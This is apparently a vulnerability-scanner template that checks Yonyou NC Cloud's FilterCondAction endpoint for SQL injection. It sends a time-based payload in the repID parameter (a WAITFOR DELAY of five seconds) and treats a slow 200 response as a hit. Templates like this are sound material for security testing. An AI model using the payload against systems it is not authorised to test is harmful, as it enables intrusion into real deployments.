id: YonYouNC-Cloud-FilterCondAction-sqlInjection

info:
  name: YonYouNC-Cloud-FilterCondAction-sqlInjection
  author: iSee857
  severity: high
  description: YonYouNC-Cloud-FilterCondAction-sqlInjection

requests:
  - method: GET
    raw:
      - |
        GET /service/~iufo/com.ufida.web.action.ActionServlet?action=nc.ui.bi.report.rep.FilterCondAction&method=execute&repID=1%27);WAITFOR+DELAY+%270:0:5%27-- HTTP/1.1
        Host: {{Host}}
      
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 200